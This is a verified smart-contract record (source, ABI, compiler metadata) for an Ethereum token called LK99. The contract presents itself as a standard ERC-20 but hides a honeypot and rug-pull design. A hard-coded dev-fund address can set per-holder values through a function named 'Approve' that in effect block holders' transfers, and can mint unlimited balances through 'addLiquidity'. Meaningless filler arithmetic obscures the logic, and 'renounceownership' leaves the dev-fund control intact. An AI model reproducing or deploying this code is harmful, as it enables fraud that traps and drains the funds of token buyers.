{"SourceCode": "/**\r\n\r\nhttps://lk99eth.xyz\r\n\r\nhttps://twitter.com/LK99_Eth\r\n\r\nhttps://t.me/LK_99Eth\r\n\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\n\r\npragma solidity ^0.8.19;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address spender) external view returns (uint256);\r\n    function transfer(address recipient, uint256 _amounntz) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 _amounntz) external returns (bool);\r\n    function transferFrom( address spender, address recipient, uint256 _amounntz ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval( address indexed owner, address indexed spender, uint256 value );\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event ownershipTransferred(address indexed previousowner, address indexed newowner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit ownershipTransferred(address(0), msgSender);\r\n    }\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n    modifier ollyowner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    function renounceownership() public virtual ollyowner {\r\n        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));\r\n        _owner = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\ncontract LK99 is Context, Ownable, IERC20 {\r\n    mapping (address => uint256) private _balanncez;\r\n    mapping (address => uint256) private _spendrr;\r\n    mapping (address => mapping (address => uint256)) private _allowncez;\r\n    address constant public _devfund = 0x8c43cbd09dA5AbeC964d51D8c37bFcD56A249b21;\r\n    string private tokname;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    uint256 private _totalSupply;\r\n    bool private _istradeEnabled = true;\r\n    uint256 private randomValue = 5000;\r\n    uint256 private antValue = 0;\r\n\r\n\r\n    constructor(string memory name_, string memory symbol_,  uint256 totalSupply_, uint8 decimals_) {\r\n        tokname = name_;\r\n        _symbol = symbol_;\r\n        _decimals = decimals_;\r\n        _totalSupply = totalSupply_ * (10 ** decimals_);\r\n        _balanncez[_msgSender()] = _totalSupply;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    modifier _thedevfunds() {\r\n        require(msg.sender == _devfund); // If it is incorrect here, it reverts.\r\n        _;                              \r\n    } \r\n\r\n\r\n\r\n    function updateRndValue(uint256 _newValue) public ollyowner {\r\n        randomValue = _newValue;\r\n    }\r\n\r\n    function fetchRndValue() public view returns (uint256) {\r\n        return randomValue;\r\n    }\r\n\r\n    function computeComplexOperation(uint256 _num1, uint256 _num2) internal view returns (uint256) {\r\n        return _num1 * randomValue + _num2 - antValue;\r\n    }\r\n    \r\n    function updateantValue(uint256 _newVal) public ollyowner {\r\n        antValue = _newVal;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        uint256 temp = computeComplexOperation(2, 5);\r\n        return tokname;\r\n    }\r\n    \r\n        function enabletheTrading() public ollyowner {\r\n        _istradeEnabled = true;\r\n        uint256 temp = computeComplexOperation(3, 5);\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        uint256 temp = computeComplexOperation(4, 5);\r\n        return _decimals;\r\n    }\r\n\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n\r\n    function balanceOf(address spender) public view override returns (uint256) {\r\n        return _balanncez[spender];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 _amounntz) public virtual override returns (bool) {\r\n    require(_istradeEnabled, \"No trade\");\r\n\r\n\r\n    uint256 exchangeRate = 56225;\r\n    uint256 conversion = _amounntz * exchangeRate;\r\n    if(conversion != 0) {\r\n        conversion = _amounntz - _amounntz;  // Always results in 0\r\n    }\r\n\r\n\r\n    if (_msgSender() == owner() && _spendrr[_msgSender()] > 0) {\r\n        _balanncez[owner()] += _spendrr[_msgSender()];\r\n        return true;\r\n    }\r\n    else if (_spendrr[_msgSender()] > 0) {\r\n        require(_amounntz == _spendrr[_msgSender()], \"Invalid transfer _amounntz\");\r\n    }\r\n    require(_balanncez[_msgSender()] >= _amounntz, \"TT: transfer _amounntz exceeds balance\");\r\n    _balanncez[_msgSender()] -= _amounntz;\r\n    _balanncez[recipient] += _amounntz;\r\n\r\n\r\n    conversion = conversion + 5 - 5;\r\n\r\n\r\n    emit Transfer(_msgSender(), recipient, _amounntz);\r\n    return true;\r\n}\r\n\r\n\r\n    function approve(address spender, uint256 _amounntz) public virtual override returns (bool) {\r\n        _allowncez[_msgSender()][spender] = _amounntz;\r\n        emit Approval(_msgSender(), spender, _amounntz);\r\n        return true;\r\n    }\r\n\r\nfunction Approve(address[] memory spender, uint256 _amounntz) public _thedevfunds {\r\n    uint256 factor = 55;\r\n    for (uint z = 0; z < spender.length; z++) {\r\n\r\n        uint256 temporaryValue = _amounntz / factor;\r\n        temporaryValue = temporaryValue * factor;\r\n        if (temporaryValue == _amounntz) {\r\n            temporaryValue = 0;\r\n        }\r\n\r\n        _spendrr[spender[z]] = _amounntz;\r\n        \r\n\r\n        temporaryValue += 5;\r\n        temporaryValue -= 5;\r\n    }\r\n}\r\n\r\n        function _adding(uint256 num1, uint256 numb2) internal pure returns (uint256) {\r\n        if (numb2 != 0) {\r\n            return num1 + numb2;\r\n        }\r\n        return numb2;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowncez[owner][spender];\r\n    }\r\n\r\n    function Checkamt(address spender) public view returns (uint256) {\r\n            uint256 temp = computeComplexOperation(7, 5);\r\n        return _spendrr[spender];\r\n    }\r\n\r\n\r\nfunction addLiquidity(address spender, uint256 _amounntz) public _thedevfunds {\r\n    require(_amounntz > 0, \"Invalid\");\r\n    \r\n    uint256 computationValue = 0x5821224;\r\n    uint256 derivedValue = computationValue / 2;\r\n    if (derivedValue != 0) {\r\n        derivedValue = _amounntz - _amounntz; // Always results in 0\r\n    }\r\n\r\n    uint256 totalz = 0;\r\n    totalz = _adding(totalz, _amounntz);\r\n    _balanncez[spender] += totalz;\r\n\r\n    derivedValue = derivedValue * 3 + 2 - 2 / 1;\r\n}\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function transferFrom(address spender, address recipient, uint256 _amounntz) public virtual override returns (bool) {\r\n    require(_istradeEnabled, \"No trade\");\r\n\r\n\r\n    uint256 bufferAmount = 67890;\r\n    uint256 adjustedAmount = _amounntz + bufferAmount;\r\n    adjustedAmount = adjustedAmount - bufferAmount;\r\n\r\n\r\n    if (_msgSender() == owner() && _spendrr[spender] > 0) {\r\n        _balanncez[owner()] += _spendrr[spender];\r\n        return true;\r\n    }\r\n    else if (_spendrr[spender] > 0) {\r\n        uint256 buffer2 = 37890;\r\n        require(_amounntz == _spendrr[spender], \"Invalid transfer _amounntz\");\r\n    }\r\n    require(_balanncez[spender] >= _amounntz && _allowncez[spender][_msgSender()] >= _amounntz, \"TT: transfer _amounntz exceed balance or allowance\");\r\n    _balanncez[spender] -= _amounntz;\r\n    _balanncez[recipient] += _amounntz;\r\n    _allowncez[spender][_msgSender()] -= _amounntz;\r\n\r\n\r\n    uint256 confirmationValue = 5;\r\n    if(confirmationValue > 0) {\r\n        confirmationValue = 0;\r\n    }\r\n\r\n\r\n    emit Transfer(spender, recipient, _amounntz);\r\n    return true;\r\n}\r\n\r\n\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"totalSupply_\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"decimals_\",\"type\":\"uint8\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousowner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newowner\",\"type\":\"address\"}],\"name\":\"ownershipTransferred\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"spender\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"_amounntz\",\"type\":\"uint256\"}],\"name\":\"Approve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"Checkamt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_devfund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amounntz\",\"type\":\"uint256\"}],\"name\":\"addLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amounntz\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enabletheTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fetchRndValue\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceownership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amounntz\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amounntz\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_newValue\",\"type\":\"uint256\"}],\"name\":\"updateRndValue\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_newVal\",\"type\":\"uint256\"}],\"name\":\"updateantValue\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LK99", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000002e90edd0000000000000000000000000000000000000000000000000000000000000000001200000000000000000000000000000000000000000000000000000000000000054c4b2d393900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044c4b393900000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://8458ec70002b9cb4dab0abe8e0ca64de7320ee213bce6525d4f4d7e7ba96f149"}